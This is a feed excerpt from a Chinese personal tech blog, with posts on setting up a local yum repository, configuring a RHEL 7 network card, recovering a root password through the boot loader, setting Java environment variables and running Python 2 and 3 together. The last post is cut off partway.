    <content type="html"><![CDATA[<p>&#x79BB;&#x7EBF;&#x73AF;&#x5883;&#x73AF;&#x5883;&#x4E0B;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x672C;&#x5730;yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x3002;<br>Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x4E3A;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x7B80;&#x5316;RPM&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;&#x7684;&#x96BE;&#x5EA6;&#x4EE5;&#x53CA;&#x81EA;&#x52A8;&#x5206;&#x6790;&#x6240;&#x9700;&#x8F6F;&#x4EF6;&#x5305;&#x53CA;&#x5176;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x7684;&#x6280;&#x672F;&#x3002;<br><a id="more"></a></p><h4 id="&#x7B2C;1&#x6B65;&#xFF1A;-&#x5207;&#x6362;&#x5230;-etc-yum-repos-d-&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;"><a href="#&#x7B2C;1&#x6B65;&#xFF1A;-&#x5207;&#x6362;&#x5230;-etc-yum-repos-d-&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;" class="headerlink" title="&#x7B2C;1&#x6B65;&#xFF1A; &#x5207;&#x6362;&#x5230;/etc/yum.repos.d/&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;)"></a>&#x7B2C;1&#x6B65;&#xFF1A; &#x5207;&#x6362;&#x5230;<code>/etc/yum.repos.d/</code>&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;)</h4><h4 id="&#x7B2C;2&#x6B65;&#xFF1A;-&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;-repo&#xFF09;"><a href="#&#x7B2C;2&#x6B65;&#xFF1A;-&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;-repo&#xFF09;" class="headerlink" title="&#x7B2C;2&#x6B65;&#xFF1A; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;.repo&#xFF09;"></a>&#x7B2C;2&#x6B65;&#xFF1A; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;<code>.repo</code>&#xFF09;</h4><pre><code>    [root@rhel_7 ~]# cd /etc/yum.repos.d/    [root@rhel_7 yum.repos.d]# vi rhel7.repo    [rhel7]    name=rhel7    baseurl=file:///media/cdrom    enabled=1    gpgcheck=0</code></pre><ul><li>[rhel7]    # yum&#x4ED3;&#x5E93;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;&#xFF0C;&#x907F;&#x514D;&#x4E0E;&#x5176;&#x4ED6;&#x4ED3;&#x5E93;&#x51B2;&#x7A81;&#x3002;</li><li>name=rhel7 # yum&#x540D;&#x79F0;&#x63CF;&#x8FF0;&#xFF0C;&#x6613;&#x4E8E;&#x8BC6;&#x522B;&#x4ED3;&#x5E93;&#x7528;&#x5904;&#x3002;</li><li>baseurl=file:///media/cdrom    # &#x63D0;&#x4F9B;&#x7684;&#x65B9;&#x5F0F;&#x5305;&#x62EC;FTP(ftp://..)&#x3001;HTTP(http://..)&#x3001;&#x672C;&#x5730;(file:///..)</li><li>enabled=1    # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x53EF;&#x7528;&#xFF1B;1&#x53EF;&#x7528;&#xFF0C;0&#x7981;&#x7528;&#x3002;</li><li>gpgcheck=1    # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x6821;&#x9A8C;&#x6587;&#x4EF6;&#xFF0C;1&#x6821;&#x9A8C;&#xFF0C;0&#x4E0D;&#x6821;&#x9A8C;&#x3002;</li><li>gpgkey=file:///media/cdrom/RPM-GPG-KEY-rehat-release    # &#x82E5;<code>gpgcheck</code>&#x5F00;&#x542F;&#xFF0C;&#x987B;&#x6307;&#x5B9A;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x5730;&#x5740;</li></ul><h4 id="&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;"><a href="#&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;" class="headerlink" title="&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;"></a>&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;</h4><p>&#x6302;&#x8F7D;ISO&#x955C;&#x50CF;&#x6216;&#x8005;&#x4E0A;&#x4F20;&#x5230;&#x672C;&#x5730;</p><pre><code class="shell">[root@rhel_7 ~]&amp; mkdir -p /media/cdrom[root@rhel_7 ~]&amp; mount -t iso9660 -o loop /usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom[root@rhel_7 ~]&amp; vim /etc/fstab/usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom iso9660 defaults,ro.loop 0 0</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;离线环境环境下配置一个本地yum软件仓库，简单整理一下。&lt;br&gt;Yum软件仓库的作用是为了进一步简化RPM管理软件的难度以及自动分析所需软件包及其依赖关系的技术。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
      <category term="yum" scheme="https://marnm.github.io/tags/yum/"/>
    
  </entry>
  
  <entry>
    <title>RedHat_7 配置网卡信息</title>
    <link href="https://marnm.github.io//posts/eb7dbe25/"/>
    <id>https://marnm.github.io//posts/eb7dbe25/</id>
    <published>2018-08-07T06:24:44.000Z</published>
    <updated>2022-05-26T13:41:51.369Z</updated>
    
    <content type="html"><![CDATA[<p>&#xA0;&#xA0;&#x5982;&#x679C;&#x60A8;&#x5177;&#x5907;&#x4E00;&#x5B9A;&#x7684;&#x8FD0;&#x7EF4;&#x7ECF;&#x9A8C;&#x6216;&#x8005;&#x719F;&#x6089;&#x65E9;&#x671F;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF0C;&#x5219;&#x5728;&#x5B66;&#x4E60;RHEL 7&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x4E0D;&#x5BB9;&#x6613;&#x63A5;&#x53D7;&#x7684;&#x5DEE;&#x5F02;&#x5316;&#x3002;&#x5728;RHEL 5&#x3001;RHEL 6&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x7684;&#x524D;&#x7F00;&#x4E3A;<strong><code>eth</code></strong>&#xFF0C;&#x7B2C;1&#x5757;&#x7F51;&#x5361;&#x4E3A;<strong><code>eth0</code></strong>&#xFF0C;&#x7B2C;2&#x5757;&#x7F51;&#x5361;&#x4E3A;<strong><code>eth1</code></strong>&#xFF1B;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;<br>&#xA0;&#xA0;&#x800C;&#x5728;RHEL 7&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x524D;&#x7F00;&#x5219;&#x4E3A;<strong><code>ifcfg</code></strong>&#x5F00;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x52A0;&#x4E0A;&#x7F51;&#x5361;&#x540D;&#x79F0;&#x5171;&#x540C;&#x7EC4;&#x6210;&#x4E86;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x4F8B;&#x5982;<strong><code>ifcfg-eno16777736</code></strong>&#x3001;<code>ifcfg-ens33</code>&#xFF1B;&#x597D;&#x5728;&#x9664;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#x53D8;&#x5316;&#x5916;&#x4E5F;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x5927;&#x7684;&#x533A;&#x522B;&#x3002;<br><a id="more"></a></p><h3 id="&#x7B2C;1&#x6B65;&#xFF1A;-&#x9996;&#x5148;&#x5207;&#x6362;&#x5230;-etc-sysconfig-network-scripts-&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;"><a href="#&#x7B2C;1&#x6B65;&#xFF1A;-&#x9996;&#x5148;&#x5207;&#x6362;&#x5230;-etc-sysconfig-network-scripts-&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;" class="headerlink" title="&#x7B2C;1&#x6B65;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;/etc/sysconfig/network-scripts/&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;"></a>&#x7B2C;1&#x6B65;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;<strong><code>/etc/sysconfig/network-scripts/</code></strong>&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;</h3><h3 id="&#x7B2C;2&#x6B65;&#xFF1A;-&#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736"><a href="#&#x7B2C;2&#x6B65;&#xFF1A;-&#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736" class="headerlink" title="&#x7B2C;2&#x6B65;&#xFF1A; &#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736"></a>&#x7B2C;2&#x6B65;&#xFF1A; &#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;<strong><code>ifcfg-eno16777736</code></strong></h3><ul><li><strong>&#x8BBE;&#x5907;&#x7C7B;&#x578B;&#xFF1A;</strong>TYPE=Ethernet</li><li><strong>&#x5730;&#x5740;&#x5206;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</strong>BOOTPROTO=static</li><li><strong>&#x7F51;&#x5361;&#x540D;&#x79F0;&#xFF1A;</strong>NAME=eno16777736</li><li><strong>&#x662F;&#x5426;&#x542F;&#x52A8;&#xFF1A;</strong>ONBOOT=yes</li><li><strong>IP&#x5730;&#x5740;&#xFF1A;</strong>IPADDR=192.168.1.10</li><li><strong>&#x5B50;&#x7F51;&#x63A9;&#x7801;&#xFF1A;</strong>NETMASK=255.255.255.0</li><li><strong>&#x7F51;&#x5173;&#x5730;&#x5740;&#xFF1A;</strong>GATEWAY=192.168.1.1</li><li><strong>DNS&#x5730;&#x5740;&#xFF1A;</strong>DNS1=114.114.114.114</li></ul><pre><code class="ini">[root@rhel_7 network-scripts]# vim /etc/sysconfig/network-scripts/ifcfg-eno16777736    TYPE=Ethernet    BOTOPROTO=static    NAME=eno16777736    ONBOOT=yes    IPADDR=192.168.1.74    NETMASK=255.255.255.0    GATEWAY=192.168.1.1    DNS1=114.114.114.114    DNS2=192.168.1.1[root@rhel_7 network-scripts]# systemctl restart network                   </code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;如果您具备一定的运维经验或者熟悉早期的Linux系统，则在学习RHEL 7时可能会遇到一些不容易接受的差异化。在RHEL 5、RHEL 6中，网卡配置的前缀为&lt;strong&gt;&lt;code&gt;eth&lt;/code&gt;&lt;/strong&gt;，第1块网卡为&lt;strong&gt;&lt;code&gt;eth0&lt;/code&gt;&lt;/strong&gt;，第2块网卡为&lt;strong&gt;&lt;code&gt;eth1&lt;/code&gt;&lt;/strong&gt;；以此类推。&lt;br&gt;&amp;nbsp;&amp;nbsp;而在RHEL 7中，网卡配置文件的前缀则为&lt;strong&gt;&lt;code&gt;ifcfg&lt;/code&gt;&lt;/strong&gt;开头，然后加上网卡名称共同组成了网卡配置文件的名字，例如&lt;strong&gt;&lt;code&gt;ifcfg-eno16777736&lt;/code&gt;&lt;/strong&gt;、&lt;code&gt;ifcfg-ens33&lt;/code&gt;；好在除了文件名变化外也没有其他大的区别。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
      <category term="rhel" scheme="https://marnm.github.io/tags/rhel/"/>
    
  </entry>
  
  <entry>
    <title>RedHat Linux重置root管理员密码</title>
    <link href="https://marnm.github.io//posts/32546aed/"/>
    <id>https://marnm.github.io//posts/32546aed/</id>
    <published>2018-08-05T07:48:25.000Z</published>
    <updated>2022-05-26T13:42:44.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x5E73;&#x65E5;&#x91CC;&#x8BA9;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5934;&#x75BC;&#x7684;&#x4E8B;&#x60C5;&#x5DF2;&#x7ECF;&#x5F88;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x5076;&#x5C14;&#x628A;linux&#x7CFB;&#x7EDF;&#x7684;&#x5BC6;&#x7801;&#x5FD8;&#x8BB0;&#x4E86;&#x5E76;&#x4E0D;&#x7528;&#x614C;&#xFF0C;&#x53EA;&#x9700;&#x7B80;&#x5355;&#x51E0;&#x6B65;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5BC6;&#x7801;&#x7684;&#x91CD;&#x7F6E;&#x5DE5;&#x4F5C;&#x3002;</p><h2 id="&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;</h2><p>RedHat&#x3001;CentOS&#x3001;<br><a id="more"></a></p><h3 id="&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;"><a href="#&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;" class="headerlink" title="&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;"></a>&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;<code>E</code>&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;</h3><p><img src="https://wx3.sinaimg.cn/mw690/006ALkzYly1ftyygehy83j30k00b474c.jpg" alt="boot-img"></p><h3 id="&#x5728;linux16-&#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd-break-&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl-X&#x8FD0;&#x884C;"><a href="#&#x5728;linux16-&#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd-break-&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl-X&#x8FD0;&#x884C;" class="headerlink" title="&#x5728;linux16 &#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd.break,&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl+X&#x8FD0;&#x884C;"></a>&#x5728;linux16 &#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;<code>rd.break</code>,&#x7136;&#x540E;&#x6309;&#x4E0B;<code>Ctrl</code>+<code>X</code>&#x8FD0;&#x884C;</h3><pre><code>    linux16 /vmlinuz-3.10.0-123.e17.x86_64 root=UUID=039848c2-4663-4223-a7\    52-e07bf143e52d ro rd.lvm.lv=rhel/root crashkernel=auto rd.lvm.lv=rhel/swap v\    console.font=latarcyrheb-sun16 vconsole.keymap=us rhgb quiet LANG=en_US.UTF-8\     rd.break</code></pre><p><img src="https://wx2.sinaimg.cn/mw1024/006ALkzYly1ft8l939p1nj30l80armx6.jpg" alt="&#x7F16;&#x8F91;&#x5185;&#x6838;&#x754C;&#x9762;"></p><h3 id="&#x4FEE;&#x6539;&#x5BC6;&#x7801;"><a href="#&#x4FEE;&#x6539;&#x5BC6;&#x7801;" class="headerlink" title="&#x4FEE;&#x6539;&#x5BC6;&#x7801;"></a>&#x4FEE;&#x6539;&#x5BC6;&#x7801;</h3><p>&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;<br><img src="https://wx4.sinaimg.cn/mw1024/006ALkzYly1ft8l8tkg45j30n80bx0sr.jpg" alt="&#x7F16;&#x8F91;&#x5982;&#x4E0B;&#x547D;&#x4EE4;"></p><pre><code>    switch_root:/# mount -o remount,rw /sysroot    switch_root:/# chroot /sysroot    sh-4.2# passwd    &#x6B64;&#x5904;&#x7565;&#x8FC7;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x8FC7;&#x7A0B;...    sh-4.2# touch /.autorelabel    sh-4.2# exit    sh-4.2# reboot</code></pre><h2 id="&#x57FA;&#x4E8E;debian&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;debian&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;debian&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;debian&#x7248;&#x672C;</h2><h2 id="&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;</h2><h2 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h2><p><a href="http://futurist.se/gldt/wp-content/uploads/12.10/gldt1210.svg" target="_blank" rel="noopener">Linux&#x884D;&#x751F;&#x7248;&#x672C;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;平日里让运维人员头疼的事情已经很多了，因此偶尔把linux系统的密码忘记了并不用慌，只需简单几步就可以完成密码的重置工作。&lt;/p&gt;
&lt;h2 id=&quot;基于rhel版本&quot;&gt;&lt;a href=&quot;#基于rhel版本&quot; class=&quot;headerlink&quot; title=&quot;基于rhel版本&quot;&gt;&lt;/a&gt;基于rhel版本&lt;/h2&gt;&lt;p&gt;RedHat、CentOS、&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
  </entry>
  
  <entry>
    <title>Java8 环境变量配置</title>
    <link href="https://marnm.github.io//posts/295162d9/"/>
    <id>https://marnm.github.io//posts/295162d9/</id>
    <published>2018-08-03T15:34:01.000Z</published>
    <updated>2022-05-26T13:30:43.307Z</updated>
    
    <content type="html"><![CDATA[<p>&#x5982;&#x4F55;&#x5728;Windows&#x4E0B;&#x5B89;&#x88C5;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;<br><a id="more"></a></p><h4 id="&#x6211;&#x7684;&#x73AF;&#x5883;"><a href="#&#x6211;&#x7684;&#x73AF;&#x5883;" class="headerlink" title="&#x6211;&#x7684;&#x73AF;&#x5883;"></a>&#x6211;&#x7684;&#x73AF;&#x5883;</h4><p>Windows 10<br>Java&#x7248;&#x672C;<code>1.8.0_161</code><br>&#x6211;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;<code>C:\Java\</code></p><h4 id="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;"><a href="#&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;" class="headerlink" title="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;"></a>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;</h4><p>&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br><code>JAVA_HOME</code> </p><blockquote><p>C:\Java\jdk1.8.0_161</p></blockquote><p><code>CLASSPATH</code></p><blockquote><p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</p></blockquote><p>&#x7F16;&#x8F91;<code>path</code></p><blockquote><p>%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin; </p></blockquote><h4 id="&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;"><a href="#&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;"></a>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;</h4><p><img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1ftwy76xcljj30lg067dg4.jpg" alt="java and javac"></p><pre><code class="java">    public class test{        public static void main(String[] args){            System.out.println(&quot;Hello World, hello java !&quot;);        }    }</code></pre><p>&#x4FDD;&#x5B58;&#x4E3A;<code>test.java</code><br>&#x7F16;&#x8BD1;<code>&#x6E90;&#x4EE3;&#x7801;</code><br><code>javac test.java</code><br><code>java test</code></p><h4 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h4><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">&#x6700;&#x65B0;&#x7248;Java&#x4E0B;&#x8F7D;&#x5730;&#x5740;</a><br><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">Java8_se &#x4E0B;&#x8F7D;&#x5730;&#x5740;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如何在Windows下安装配置Java环境变量配置&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="https://marnm.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Java" scheme="https://marnm.github.io/tags/Java/"/>
    
      <category term="编程" scheme="https://marnm.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Win10环境下Python2、3和pip2、3版本共存</title>
    <link href="https://marnm.github.io//posts/e9c6771b/"/>
    <id>https://marnm.github.io//posts/e9c6771b/</id>
    <published>2018-08-03T15:04:25.000Z</published>
    <updated>2020-04-09T12:57:53.399Z</updated>
    
    <content type="html"><![CDATA[<p>&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;Win10-x64&#x7684;&#x7535;&#x8111;&#x6765;&#x64CD;&#x4F5C;<br>&#x6211;&#x7684;Python&#x5B89;&#x88C5;&#x76EE;&#x5F55;<code>C:\Python\</code><br><a id="more"></a><br><strong>&#x5B89;&#x88C5;Python</strong><br>&#x9996;&#x5148;&#x5B89;&#x88C5;Python3<br><code>C:\Python\Python35\</code><br>&#x76F4;&#x63A5;&#x4E0B;&#x4E00;&#x6B65;&#x4E0B;&#x4E00;&#x6B65;&#x5373;&#x53EF;</p><p>&#x7136;&#x540E;&#x5B89;&#x88C5;Python2<br><code>C:\Python\Python27\</code><br>&#x5B89;&#x88C5;<code>Python2</code>&#x7684;&#x65F6;&#x5019;&#x628A;&#x6DFB;&#x52A0;&#x5230;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x52FE;&#x5148;&#x53BB;&#x6389;</p><p>&#x4FEE;&#x6539;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x7F16;&#x8F91;<code>Path</code>&#x53D8;&#x91CF;&#xFF0C;&#x6DFB;&#x52A0;<code>Python2</code>&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x8FD9;&#x91CC;&#x6211;&#x7684;&#x76EE;&#x5F55;&#x662F;<code>C:\Python\Python27\</code>&#x548C;<code>C:\Python\Python27\Scripts\</code></p><p>&#x5C06;<code>python.exe</code>&#x91CD;&#x547D;&#x540D;&#x4E86;<br>&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;<code>python3.exe</code>&#xFF1B;<